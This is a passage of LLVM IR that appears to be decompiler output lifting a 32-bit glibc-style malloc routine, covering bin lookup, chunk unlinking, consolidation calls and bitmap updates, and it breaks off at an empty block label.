  %v0_8050240 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_8050240, -32
  br i1 %tmp, label %dec_label_pc_8050257, label %dec_label_pc_8050245

dec_label_pc_8050245:                             ; preds = %entry
  %v0_8050245 = load i32, i32* %stack_var_-92, align 4
  %v1_8050245 = call i32 @__errno_location(i32 %v0_8050245)
  store i32 %v1_8050245, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805024c = inttoptr i32 %v1_8050245 to i32*
  store i32 12, i32* %v1_805024c, align 4
  br label %dec_label_pc_80509aa

dec_label_pc_8050257:                             ; preds = %entry
  %v1_8050257 = add i32 %v0_8050240, 11
  %tmp136 = icmp ult i32 %v1_8050257, 16
  br i1 %tmp136, label %dec_label_pc_805026e, label %dec_label_pc_8050267

dec_label_pc_8050267:                             ; preds = %dec_label_pc_8050257
  %v1_8050267 = and i32 %v1_8050257, -8
  br label %dec_label_pc_805026e

dec_label_pc_805026e:                             ; preds = %dec_label_pc_8050257, %dec_label_pc_8050267
  %storemerge133 = phi i32 [ %v1_8050267, %dec_label_pc_8050267 ], [ %v1_8050257, %dec_label_pc_8050257 ]
  %v1_805060e = phi i32 [ %v1_8050267, %dec_label_pc_8050267 ], [ 16, %dec_label_pc_8050257 ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_805026e = load i8, i8* @global_var_8060a00.188, align 1
  %v1_805026e = sext i8 %v0_805026e to i32
  store i32 %v1_805026e, i32* @ebx, align 4
  %v3_8050274 = urem i8 %v0_805026e, 2
  %v4_8050274 = icmp eq i8 %v3_8050274, 0
  %v1_8050277 = icmp eq i1 %v4_8050274, false
  br i1 %v1_8050277, label %dec_label_pc_8050296, label %dec_label_pc_8050279

dec_label_pc_8050279:                             ; preds = %dec_label_pc_805026e
  %v2_8050279 = icmp eq i8 %v0_805026e, 0
  %v1_805027b = icmp eq i1 %v2_8050279, false
  br i1 %v1_805027b, label %dec_label_pc_8050579, label %dec_label_pc_8050281

dec_label_pc_8050281:                             ; preds = %dec_label_pc_8050279
  store i32 ptrtoint (i8* @global_var_8060a00.188 to i32), i32* %stack_var_-92, align 4
  %v2_8050289 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8060a00.188 to i32*))
  store i32 %v2_8050289, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050579

dec_label_pc_8050296:                             ; preds = %dec_label_pc_805026e
  %v11_8050296 = trunc i32 %v1_805060e to i8
  %v8_805029a = icmp ugt i8 %v11_8050296, %v0_805026e
  br i1 %v8_805029a, label %dec_label_pc_80502b7, label %dec_label_pc_805029c

dec_label_pc_805029c:                             ; preds = %dec_label_pc_8050296
  %v2_80502a0 = udiv i32 %v1_805060e, 2
  store i32 %v2_80502a0, i32* %eax.global-to-local, align 4
  %v1_80502a2 = add i32 %v2_80502a0, ptrtoint (i8* @global_var_8060a00.188 to i32)
  store i32 %v1_80502a2, i32* @ecx, align 4
  %v1_80502a8 = add i32 %v2_80502a0, add (i32 ptrtoint (i8* @global_var_8060a00.188 to i32), i32 -4)
  %v2_80502a8 = inttoptr i32 %v1_80502a8 to i32*
  %v3_80502a8 = load i32, i32* %v2_80502a8, align 4
  store i32 %v3_80502a8, i32* @edx, align 4
  %v1_80502ab = icmp eq i32 %v3_80502a8, 0
  br i1 %v1_80502ab, label %dec_label_pc_80502b7, label %dec_label_pc_80502af

dec_label_pc_80502af:                             ; preds = %dec_label_pc_805029c
  %v1_80502af = add i32 %v3_80502a8, 8
  %v2_80502af = inttoptr i32 %v1_80502af to i32*
  %v3_80502af = load i32, i32* %v2_80502af, align 4
  store i32 %v3_80502af, i32* %eax.global-to-local, align 4
  store i32 %v3_80502af, i32* %v2_80502a8, align 4
  br label %dec_label_pc_80502f0

dec_label_pc_80502b7:                             ; preds = %dec_label_pc_805029c, %dec_label_pc_8050296
  %v8_80502b7 = icmp ult i32 %v1_805060e, 255
  %v6_80502bf = icmp ugt i32 %v1_805060e, 255
  store i32 %v1_805060e, i32* @eax, align 4
  br i1 %v6_80502bf, label %dec_label_pc_80502f8, label %dec_label_pc_80502c1

dec_label_pc_80502c1:                             ; preds = %dec_label_pc_80502b7
  %v2_80502c5 = udiv i32 %v1_805060e, 8
  store i32 %v2_80502c5, i32* %eax.global-to-local, align 4
  %v1_80502c8 = mul nuw i32 %v2_80502c5, 8
  %v2_80502c8 = add i32 %v1_80502c8, ptrtoint (i32* @global_var_8060a2c.189 to i32)
  store i32 %v2_80502c8, i32* @ecx, align 4
  %v1_80502d3 = add i32 %v1_80502c8, add (i32 ptrtoint (i32* @global_var_8060a2c.189 to i32), i32 12)
  %v2_80502d3 = inttoptr i32 %v1_80502d3 to i32*
  %v3_80502d3 = load i32, i32* %v2_80502d3, align 4
  store i32 %v3_80502d3, i32* @edx, align 4
  %v12_80502d6 = icmp eq i32 %v3_80502d3, %v2_80502c8
  br i1 %v12_80502d6, label %dec_label_pc_80503f4.preheader, label %dec_label_pc_80502de

dec_label_pc_80502de:                             ; preds = %dec_label_pc_80502c1
  store i32 %v1_805060e, i32* %ebx.global-to-local, align 4
  %v1_80502e2 = add i32 %v3_80502d3, 12
  %v2_80502e2 = inttoptr i32 %v1_80502e2 to i32*
  %v3_80502e2 = load i32, i32* %v2_80502e2, align 4
  store i32 %v3_80502e2, i32* %eax.global-to-local, align 4
  %v2_80502e5 = or i32 %v1_805060e, 4
  %v3_80502e5 = add i32 %v3_80502d3, %v2_80502e5
  %v4_80502e5 = inttoptr i32 %v3_80502e5 to i32*
  %v5_80502e5 = load i32, i32* %v4_80502e5, align 4
  %v6_80502e5 = or i32 %v5_80502e5, 1
  store i32 %v6_80502e5, i32* %v4_80502e5, align 4
  %v0_80502ea = load i32, i32* %eax.global-to-local, align 4
  %v1_80502ea = load i32, i32* @ecx, align 4
  %v2_80502ea = add i32 %v1_80502ea, 12
  %v3_80502ea = inttoptr i32 %v2_80502ea to i32*
  store i32 %v0_80502ea, i32* %v3_80502ea, align 4
  %v0_80502ed = load i32, i32* @ecx, align 4
  %v1_80502ed = load i32, i32* %eax.global-to-local, align 4
  %v2_80502ed = add i32 %v1_80502ed, 8
  %v3_80502ed = inttoptr i32 %v2_80502ed to i32*
  store i32 %v0_80502ed, i32* %v3_80502ed, align 4
  br label %dec_label_pc_80502f0

dec_label_pc_80502f0:                             ; preds = %dec_label_pc_80502af, %dec_label_pc_80502de
  %v0_80502f0 = load i32, i32* @edx, align 4
  %v1_80502f0 = add i32 %v0_80502f0, 8
  store i32 %v1_80502f0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050999

dec_label_pc_80502f8:                             ; preds = %dec_label_pc_80502b7
  %v0_80502fc = call i32 @__malloc_largebin_index()
  store i32 %v0_80502fc, i32* %eax.global-to-local, align 4
  %v3_8050301 = and i8 %v0_805026e, 2
  %v4_8050301 = icmp eq i8 %v3_8050301, 0
  br i1 %v4_8050301, label %dec_label_pc_80503f4.preheader, label %dec_label_pc_805030e

dec_label_pc_805030e:                             ; preds = %dec_label_pc_80502f8
  store i32 ptrtoint (i8* @global_var_8060a00.188 to i32), i32* %stack_var_-92, align 4
  %v2_8050316 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8060a00.188 to i32*))
  store i32 %v2_8050316, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503f4.preheader

dec_label_pc_80503f4.preheader:                   ; preds = %dec_label_pc_805030e, %dec_label_pc_80502c1, %dec_label_pc_80502f8
  %stack_var_-40.0.ph = phi i32 [ %v2_80502c5, %dec_label_pc_80502c1 ], [ %v0_80502fc, %dec_label_pc_805030e ], [ %v0_80502fc, %dec_label_pc_80502f8 ]
  %v1_805034a = add i32 %v1_805060e, 16
  %v0_80503f4109 = load i32, i32* @global_var_8060a40.192, align 64
  store i32 %v0_80503f4109, i32* @ebp, align 4
  %v9_80503fa115 = icmp eq i32 %v0_80503f4109, 134613556
  %v1_8050400117 = icmp eq i1 %v9_80503fa115, false
  br i1 %v1_8050400117, label %dec_label_pc_8050323, label %dec_label_pc_8050406

dec_label_pc_8050323:                             ; preds = %dec_label_pc_80503f4.preheader, %bb82
  %v0_80503f4118 = phi i32 [ %v0_80503f4, %bb82 ], [ %v0_80503f4109, %dec_label_pc_80503f4.preheader ]
  %v1_8050323 = add i32 %v0_80503f4118, 4
  %v2_8050323 = inttoptr i32 %v1_8050323 to i32*
  %v3_8050323 = load i32, i32* %v2_8050323, align 4
  %v1_8050326 = add i32 %v0_80503f4118, 12
  %v2_8050326 = inttoptr i32 %v1_8050326 to i32*
  %v3_8050326 = load i32, i32* %v2_8050326, align 4
  store i32 %v3_8050326, i32* @edx, align 4
  %v1_8050329 = and i32 %v3_8050323, -4
  store i32 %v1_8050329, i32* @edi, align 4
  br i1 %v6_80502bf, label %dec_label_pc_8050355, label %dec_label_pc_8050336

dec_label_pc_8050336:                             ; preds = %dec_label_pc_8050323
  %v9_8050336 = icmp eq i32 %v3_8050326, 134613556
  %v1_805033c = icmp eq i1 %v9_8050336, false
  br i1 %v1_805033c, label %dec_label_pc_8050355, label %dec_label_pc_805033e

dec_label_pc_805033e:                             ; preds = %dec_label_pc_8050336
  %v1_805033e = load i32, i32* @global_var_8060a30.190, align 16
  %v12_805033e = icmp eq i32 %v0_80503f4118, %v1_805033e
  %v1_8050344 = icmp eq i1 %v12_805033e, false
  br i1 %v1_8050344, label %dec_label_pc_8050355, label %dec_label_pc_8050346

dec_label_pc_8050346:                             ; preds = %dec_label_pc_805033e
  store i32 %v1_805034a, i32* %eax.global-to-local, align 4
  %v6_805034f = icmp ugt i32 %v1_8050329, %v1_805034a
  br i1 %v6_805034f, label %dec_label_pc_8050934, label %dec_label_pc_8050355

dec_label_pc_8050355:                             ; preds = %dec_label_pc_8050346, %dec_label_pc_805033e, %dec_label_pc_8050336, %dec_label_pc_8050323
  store i32 ptrtoint (i32* @global_var_8060a34.191 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_8050326, i32* @global_var_8060a40.192, align 4
  %v2_805035d = add i32 %v3_8050326, 8
  %v3_805035d = inttoptr i32 %v2_805035d to i32*
  store i32 ptrtoint (i32* @global_var_8060a34.191 to i32), i32* %v3_805035d, align 4
  %v0_8050360 = load i32, i32* @edi, align 4
  %v15_8050360 = icmp eq i32 %v0_8050360, %v1_805060e
  br i1 %v15_8050360, label %dec_label_pc_8050975, label %dec_label_pc_805036a

dec_label_pc_805036a:                             ; preds = %dec_label_pc_8050355
  %v6_8050370 = icmp ugt i32 %v0_8050360, 255
  br i1 %v6_8050370, label %dec_label_pc_8050383, label %dec_label_pc_8050372

dec_label_pc_8050372:                             ; preds = %dec_label_pc_805036a
  %v2_8050374 = udiv i32 %v0_8050360, 8
  store i32 %v2_8050374, i32* %esi.global-to-local, align 4
  %v1_8050377 = mul nuw i32 %v2_8050374, 8
  %v2_8050377 = add i32 %v1_8050377, 134613548
  store i32 %v2_8050377, i32* @ebx, align 4
  %v1_805037e = add i32 %v1_8050377, 134613556
  %v2_805037e = inttoptr i32 %v1_805037e to i32*
  %v3_805037e = load i32, i32* %v2_805037e, align 4
  store i32 %v3_805037e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503cc

dec_label_pc_8050383:                             ; preds = %dec_label_pc_805036a
  store i32 %v0_8050360, i32* @eax, align 4
  %v0_8050385 = call i32 @__malloc_largebin_index()
  store i32 %v0_8050385, i32* %esi.global-to-local, align 4
  %v1_805038c = mul i32 %v0_8050385, 8
  %v2_805038c = add i32 %v1_805038c, ptrtoint (i32* @global_var_8060a2c.189 to i32)
  store i32 %v2_805038c, i32* %eax.global-to-local, align 4
  %v1_8050393 = add i32 %v1_805038c, add (i32 ptrtoint (i32* @global_var_8060a2c.189 to i32), i32 8)
  %v2_8050393 = inttoptr i32 %v1_8050393 to i32*
  %v3_8050393 = load i32, i32* %v2_8050393, align 4
  store i32 %v3_8050393, i32* %edx.global-to-local, align 4
  %v12_8050396 = icmp eq i32 %v3_8050393, %v2_805038c
  store i32 %v3_8050393, i32* @ebx, align 4
  br i1 %v12_8050396, label %dec_label_pc_80503cc, label %dec_label_pc_80503a0

dec_label_pc_80503a0:                             ; preds = %dec_label_pc_8050383
  %v1_80503a0 = add i32 %v1_805038c, add (i32 ptrtoint (i32* @global_var_8060a2c.189 to i32), i32 12)
  %v2_80503a0 = inttoptr i32 %v1_80503a0 to i32*
  %v3_80503a0 = load i32, i32* %v2_80503a0, align 4
  store i32 %v3_80503a0, i32* @ebx, align 4
  %v0_80503a3 = load i32, i32* @edi, align 4
  %v2_80503a3 = add i32 %v3_80503a0, 4
  %v3_80503a3 = inttoptr i32 %v2_80503a3 to i32*
  %v4_80503a3 = load i32, i32* %v3_80503a3, align 4
  %v10_80503a3 = icmp ult i32 %v0_80503a3, %v4_80503a3
  %v1_80503a6 = icmp eq i1 %v10_80503a3, false
  br i1 %v1_80503a6, label %dec_label_pc_80503ae, label %dec_label_pc_80503cc

dec_label_pc_80503ae:                             ; preds = %dec_label_pc_80503a0
  %v1_80503b0 = or i32 %v0_80503a3, 1
  store i32 %v1_80503b0, i32* %eax.global-to-local, align 4
  store i32 %v3_8050393, i32* %ebx.global-to-local, align 4
  %v2_80503c4101 = add i32 %v3_8050393, 4
  %v3_80503c4102 = inttoptr i32 %v2_80503c4101 to i32*
  %v4_80503c4103 = load i32, i32* %v3_80503c4102, align 4
  %v10_80503c4105 = icmp ult i32 %v1_80503b0, %v4_80503c4103
  br i1 %v10_80503c4105, label %dec_label_pc_80503b5, label %dec_label_pc_80503c9

dec_label_pc_80503b5:                             ; preds = %dec_label_pc_80503ae, %dec_label_pc_80503b5
  %v0_80503c9106 = phi i32 [ %v3_80503b9, %dec_label_pc_80503b5 ], [ %v3_8050393, %dec_label_pc_80503ae ]
  store i32 %v0_80503c9106, i32* %ecx.global-to-local, align 4
  %v1_80503b9 = add i32 %v0_80503c9106, 8
  %v2_80503b9 = inttoptr i32 %v1_80503b9 to i32*
  %v3_80503b9 = load i32, i32* %v2_80503b9, align 4
  store i32 %v3_80503b9, i32* %ecx.global-to-local, align 4
  store i32 %v3_80503b9, i32* %ebx.global-to-local, align 4
  %v2_80503c4 = add i32 %v3_80503b9, 4
  %v3_80503c4 = inttoptr i32 %v2_80503c4 to i32*
  %v4_80503c4 = load i32, i32* %v3_80503c4, align 4
  %v10_80503c4 = icmp ult i32 %v1_80503b0, %v4_80503c4
  br i1 %v10_80503c4, label %dec_label_pc_80503b5, label %dec_label_pc_80503c9

dec_label_pc_80503c9:                             ; preds = %dec_label_pc_80503b5, %dec_label_pc_80503ae
  %v0_80503c9.lcssa = phi i32 [ %v3_8050393, %dec_label_pc_80503ae ], [ %v3_80503b9, %dec_label_pc_80503b5 ]
  %v1_80503c9 = add i32 %v0_80503c9.lcssa, 12
  %v2_80503c9 = inttoptr i32 %v1_80503c9 to i32*
  %v3_80503c9 = load i32, i32* %v2_80503c9, align 4
  store i32 %v3_80503c9, i32* @ebx, align 4
  br label %dec_label_pc_80503cc

dec_label_pc_80503cc:                             ; preds = %dec_label_pc_8050372, %dec_label_pc_80503a0, %dec_label_pc_8050383, %dec_label_pc_80503c9
  %v0_80503cc = phi i32 [ %v0_8050385, %dec_label_pc_8050383 ], [ %v0_8050385, %dec_label_pc_80503c9 ], [ %v0_8050385, %dec_label_pc_80503a0 ], [ %v2_8050374, %dec_label_pc_8050372 ]
  %stack_var_-64.1 = phi i32 [ %v3_8050393, %dec_label_pc_8050383 ], [ %v0_80503c9.lcssa, %dec_label_pc_80503c9 ], [ %v2_805038c, %dec_label_pc_80503a0 ], [ %v3_805037e, %dec_label_pc_8050372 ]
  %v1_80503ce = urem i32 %v0_80503cc, 32
  %v2_80503ce = icmp eq i32 %v1_80503ce, 0
  store i32 %v1_80503ce, i32* %esi.global-to-local, align 4
  store i32 %v1_80503ce, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80503d8 = sdiv i32 %v0_80503cc, 32
  store i32 %v2_80503d8, i32* %edx.global-to-local, align 4
  br i1 %v2_80503ce, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_80503cc
  %v5_80503db = shl i32 1, %v1_80503ce
  store i32 %v5_80503db, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_80503cc, %bb
  %v5_80503dd = phi i32 [ 1, %dec_label_pc_80503cc ], [ %v5_80503db, %bb ]
  %v1_80503dd = mul nsw i32 %v2_80503d8, 4
  %v2_80503dd = add i32 %v1_80503dd, ptrtoint (i32* @global_var_8060d34.193 to i32)
  %v3_80503dd = inttoptr i32 %v2_80503dd to i32*
  %v4_80503dd = load i32, i32* %v3_80503dd, align 4
  %v6_80503dd = or i32 %v4_80503dd, %v5_80503dd
  store i32 %v6_80503dd, i32* %v3_80503dd, align 4
  %v0_80503e4 = load i32, i32* @ebx, align 4
  %v1_80503e4 = load i32, i32* @ebp, align 4
  %v2_80503e4 = add i32 %v1_80503e4, 12
  %v3_80503e4 = inttoptr i32 %v2_80503e4 to i32*
  store i32 %v0_80503e4, i32* %v3_80503e4, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_80503eb = load i32, i32* @ebp, align 4
  %v2_80503eb = add i32 %v1_80503eb, 8
  %v3_80503eb = inttoptr i32 %v2_80503eb to i32*
  store i32 %stack_var_-64.1, i32* %v3_80503eb, align 4
  %v0_80503ee = load i32, i32* @ebp, align 4
  %v1_80503ee = load i32, i32* @esi, align 4
  %v2_80503ee = add i32 %v1_80503ee, 12
  %v3_80503ee = inttoptr i32 %v2_80503ee to i32*
  store i32 %v0_80503ee, i32* %v3_80503ee, align 4
  %v0_80503f1 = load i32, i32* @ebp, align 4
  %v1_80503f1 = load i32, i32* @ebx, align 4
  %v2_80503f1 = add i32 %v1_80503f1, 8
  %v3_80503f1 = inttoptr i32 %v2_80503f1 to i32*
  store i32 %v0_80503f1, i32* %v3_80503f1, align 4
  %v0_80503f4 = load i32, i32* @global_var_8060a40.192, align 64
  store i32 %v0_80503f4, i32* @ebp, align 4
  %v9_80503fa = icmp eq i32 %v0_80503f4, 134613556
  %v1_8050400 = icmp eq i1 %v9_80503fa, false
  br i1 %v1_8050400, label %dec_label_pc_8050323, label %dec_label_pc_8050406

dec_label_pc_8050406:                             ; preds = %bb82, %dec_label_pc_80503f4.preheader
  br i1 %v8_80502b7, label %dec_label_pc_8050494, label %dec_label_pc_8050414

dec_label_pc_8050414:                             ; preds = %dec_label_pc_8050406
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8050418 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8050418 = add i32 %v1_8050418, ptrtoint (i32* @global_var_8060a2c.189 to i32)
  store i32 %v2_8050418, i32* %edx.global-to-local, align 4
  %v1_805041f = add i32 %v1_8050418, add (i32 ptrtoint (i32* @global_var_8060a2c.189 to i32), i32 12)
  %v2_805041f = inttoptr i32 %v1_805041f to i32*
  %storemerge1.pre = load i32, i32* %v2_805041f, align 4
  br label %dec_label_pc_8050490

dec_label_pc_8050424:                             ; preds = %dec_label_pc_8050490
  %v1_8050424 = add i32 %v4_805043b, 4
  %v2_8050424 = inttoptr i32 %v1_8050424 to i32*
  %v3_8050424 = load i32, i32* %v2_8050424, align 4
  store i32 %v3_8050424, i32* %ebx.global-to-local, align 4
  %v1_8050427 = add i32 %v4_805043b, 12
  %v2_8050427 = inttoptr i32 %v1_8050427 to i32*
  %v3_8050427 = load i32, i32* %v2_8050427, align 4
  store i32 %v3_8050427, i32* @ecx, align 4
  %v1_805042a = and i32 %v3_8050424, -4
  store i32 %v1_805042a, i32* @ebx, align 4
  %v10_805042d = icmp ult i32 %v1_805042a, %v1_805060e
  br i1 %v10_805042d, label %dec_label_pc_8050490, label %dec_label_pc_8050433

dec_label_pc_8050433:                             ; preds = %dec_label_pc_8050424
  %v1_8050433 = add i32 %v4_805043b, 8
  %v2_8050433 = inttoptr i32 %v1_8050433 to i32*
  %v3_8050433 = load i32, i32* %v2_8050433, align 4
  store i32 %v3_8050433, i32* @edx, align 4
  %v1_8050436 = add i32 %v3_8050433, 12
  %v2_8050436 = inttoptr i32 %v1_8050436 to i32*
  %v3_8050436 = load i32, i32* %v2_8050436, align 4
  %v15_8050436 = icmp eq i32 %v3_8050436, %v4_805043b
  %v1_8050439 = icmp eq i1 %v15_8050436, false
  br i1 %v1_8050439, label %dec_label_pc_8050440, label %dec_label_pc_805043b

dec_label_pc_805043b:                             ; preds = %dec_label_pc_8050433
  %v1_805043b = add i32 %v3_8050427, 8
  %v2_805043b = inttoptr i32 %v1_805043b to i32*
  %v3_805043b = load i32, i32* %v2_805043b, align 4
  %v15_805043b = icmp eq i32 %v3_805043b, %v4_805043b
  br i1 %v15_805043b, label %dec_label_pc_8050445, label %dec_label_pc_8050440

dec_label_pc_8050440:                             ; preds = %dec_label_pc_805043b, %dec_label_pc_8050433
  %v0_8050440 = call i32 @abort()
  store i32 %v0_8050440, i32* %eax.global-to-local, align 4
  %v0_8050445.pre = load i32, i32* @ebx, align 4
  %v0_805044b.pre = load i32, i32* @ecx, align 4
  %v1_805044b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050445

dec_label_pc_8050445:                             ; preds = %dec_label_pc_805043b, %dec_label_pc_8050440
  %v1_805044b = phi i32 [ %v3_8050433, %dec_label_pc_805043b ], [ %v1_805044b.pre, %dec_label_pc_8050440 ]
  %v0_805044b = phi i32 [ %v3_8050427, %dec_label_pc_805043b ], [ %v0_805044b.pre, %dec_label_pc_8050440 ]
  %v0_8050445 = phi i32 [ %v1_805042a, %dec_label_pc_805043b ], [ %v0_8050445.pre, %dec_label_pc_8050440 ]
  %v5_8050447 = sub i32 %v0_8050445, %v1_805060e
  store i32 %v5_8050447, i32* %esi.global-to-local, align 4
  %v2_805044b = add i32 %v1_805044b, 12
  %v3_805044b = inttoptr i32 %v2_805044b to i32*
  store i32 %v0_805044b, i32* %v3_805044b, align 4
  %v0_805044e = load i32, i32* @edx, align 4
  %v1_805044e = load i32, i32* @ecx, align 4
  %v2_805044e = add i32 %v1_805044e, 8
  %v3_805044e = inttoptr i32 %v2_805044e to i32*
  store i32 %v0_805044e, i32* %v3_805044e, align 4
  %v0_8050451 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050451 = add i32 %v0_8050451, 8
  store i32 %v1_8050451, i32* @ecx, align 4
  %v0_8050454 = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_8050454, 16
  br i1 %tmp137, label %dec_label_pc_8050983, label %dec_label_pc_805045d

dec_label_pc_805045d:                             ; preds = %dec_label_pc_8050445
  %v2_8050461 = add i32 %v0_8050451, %v1_805060e
  store i32 %v2_8050461, i32* @edx, align 4
  %v1_8050464 = or i32 %v1_805060e, 1
  store i32 %v1_8050464, i32* %ebx.global-to-local, align 4
  %v2_8050467 = add i32 %v0_8050451, 4
  %v3_8050467 = inttoptr i32 %v2_8050467 to i32*
  store i32 %v1_8050464, i32* %v3_8050467, align 4
  %v0_805046a = load i32, i32* %esi.global-to-local, align 4
  %v1_805046c = or i32 %v0_805046a, 1
  store i32 %v1_805046c, i32* %eax.global-to-local, align 4
  %v0_805046f = load i32, i32* @edx, align 4
  %v1_805046f = load i32, i32* @ebp, align 4
  %v2_805046f = add i32 %v1_805046f, 8
  %v3_805046f = inttoptr i32 %v2_805046f to i32*
  store i32 %v0_805046f, i32* %v3_805046f, align 4
  %v0_8050472 = load i32, i32* @edx, align 4
  %v1_8050472 = load i32, i32* @ebp, align 4
  %v2_8050472 = add i32 %v1_8050472, 12
  %v3_8050472 = inttoptr i32 %v2_8050472 to i32*
  store i32 %v0_8050472, i32* %v3_8050472, align 4
  %v0_8050475 = load i32, i32* @edx, align 4
  %v1_8050475 = add i32 %v0_8050475, 8
  %v2_8050475 = inttoptr i32 %v1_8050475 to i32*
  store i32 ptrtoint (i32* @global_var_8060a34.191 to i32), i32* %v2_8050475, align 4
  %v0_805047c = load i32, i32* @edx, align 4
  %v1_805047c = add i32 %v0_805047c, 12
  %v2_805047c = inttoptr i32 %v1_805047c to i32*
  store i32 ptrtoint (i32* @global_var_8060a34.191 to i32), i32* %v2_805047c, align 4
  %v0_8050483 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050483 = load i32, i32* @edx, align 4
  %v2_8050483 = add i32 %v1_8050483, 4
  %v3_8050483 = inttoptr i32 %v2_8050483 to i32*
  store i32 %v0_8050483, i32* %v3_8050483, align 4
  %v0_8050486 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050486 = load i32, i32* @edx, align 4
  %v3_8050486 = add i32 %v1_8050486, %v0_8050486
  %v4_8050486 = inttoptr i32 %v3_8050486 to i32*
  store i32 %v0_8050486, i32* %v4_8050486, align 4
  br label %dec_label_pc_8050988

dec_label_pc_8050490:                             ; preds = %dec_label_pc_8050424, %dec_label_pc_8050414
  %v4_805043b = phi i32 [ %storemerge1.pre, %dec_label_pc_8050414 ], [ %v3_8050427, %dec_label_pc_8050424 ]
  store i32 %v4_805043b, i32* %eax.global-to-local, align 4
  %v12_8050490 = icmp eq i32 %v4_805043b, %v2_8050418
  %v1_8050492 = icmp eq i1 %v12_8050490, false
  br i1 %v1_8050492, label %dec_label_pc_8050424, label %dec_label_pc_8050494.loopexit

dec_label_pc_8050494.loopexit:                    ; preds = %dec_label_pc_8050490
  br label %dec_label_pc_8050494

dec_label_pc_8050494:                             ; preds = %dec_label_pc_8050494.loopexit, %dec_label_pc_8050406
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805049d = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_805049d, i32* %ecx.global-to-local, align 4
  %v2_80504a0 = udiv i32 %v1_805049d, 32
  store i32 %v2_80504a0, i32* @edi, align 4
  %v1_80504a3 = mul nuw nsw i32 %v2_80504a0, 4
  %v2_80504a3 = add i32 %v1_80504a3, ptrtoint (i32* @global_var_8060d34.193 to i32)
  %v3_80504a3 = inttoptr i32 %v2_80504a3 to i32*
  %v4_80504a3 = load i32, i32* %v3_80504a3, align 4
  store i32 %v4_80504a3, i32* %edx.global-to-local, align 4
  %v1_80504aa = mul i32 %v1_805049d, 8
  %v2_80504aa = add i32 %v1_80504aa, ptrtoint (i32* @global_var_8060a2c.189 to i32)
  store i32 %v2_80504aa, i32* %ebx.global-to-local, align 4
  %v1_80504b1 = urem i32 %v1_805049d, 32
  %v2_80504b1 = icmp eq i32 %v1_80504b1, 0
  store i32 %v1_80504b1, i32* %ecx.global-to-local, align 4
  br i1 %v2_80504b1, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_8050494
  %v5_80504b4 = shl i32 1, %v1_80504b1
  store i32 %v5_80504b4, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8050494, %bb83, %dec_label_pc_80504f5
  %v1_80504b6 = phi i32 [ %v1_80504b6.pre, %dec_label_pc_80504f5 ], [ %v4_80504a3, %bb83 ], [ %v4_80504a3, %dec_label_pc_8050494 ]
  %v0_80504ba = phi i32 [ %v0_80504b6.pre, %dec_label_pc_80504f5 ], [ %v5_80504b4, %bb83 ], [ 1, %dec_label_pc_8050494 ]
  %tmp84 = icmp ule i32 %v0_80504ba, %v1_80504b6
  %v1_80504ba = icmp eq i32 %v0_80504ba, 0
  %v1_80504bc = icmp eq i1 %v1_80504ba, false
  %or.cond = and i1 %tmp84, %v1_80504bc
  br i1 %or.cond, label %dec_label_pc_80504ba.dec_label_pc_80504ea.preheader_crit_edge, label %dec_label_pc_80504be.preheader

dec_label_pc_80504ba.dec_label_pc_80504ea.preheader_crit_edge: ; preds = %.preheader
  %v0_80504e512.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504ea.preheader

dec_label_pc_80504be.preheader:                   ; preds = %.preheader
  %v0_80504be.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80504be

dec_label_pc_80504be:                             ; preds = %dec_label_pc_80504be.preheader, %dec_label_pc_80504c8
  %v0_80504be = phi i32 [ %v0_80504be.pre, %dec_label_pc_80504be.preheader ], [ %v1_80504be, %dec_label_pc_80504c8 ]
  %v1_80504be = add i32 %v0_80504be, 1
  store i32 %v1_80504be, i32* @edi, align 4
  %v6_80504c2 = icmp ugt i32 %v1_80504be, 2
  br i1 %v6_80504c2, label %dec_label_pc_8050579.loopexit, label %dec_label_pc_80504c8

dec_label_pc_80504c8:                             ; preds = %dec_label_pc_80504be
  %v1_80504c8 = mul i32 %v1_80504be, 4
  %v2_80504c8 = add i32 %v1_80504c8, ptrtoint (i32* @global_var_8060d34.193 to i32)
  %v3_80504c8 = inttoptr i32 %v2_80504c8 to i32*
  %v4_80504c8 = load i32, i32* %v3_80504c8, align 4
  store i32 %v4_80504c8, i32* %edx.global-to-local, align 4
  %v1_80504cf = icmp eq i32 %v4_80504c8, 0
  br i1 %v1_80504cf, label %dec_label_pc_80504be, label %dec_label_pc_80504d3

dec_label_pc_80504d3:                             ; preds = %dec_label_pc_80504c8
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80504da = mul i32 %v1_80504be, 256
  store i32 %v2_80504da, i32* %eax.global-to-local, align 4
  %v1_80504dd = add i32 %v2_80504da, ptrtoint (i32* @global_var_8060a2c.189 to i32)
  store i32 %v1_80504dd, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504ea.preheader

dec_label_pc_80504ea.preheader:                   ; preds = %dec_label_pc_80504ba.dec_label_pc_80504ea.preheader_crit_edge, %dec_label_pc_80504d3
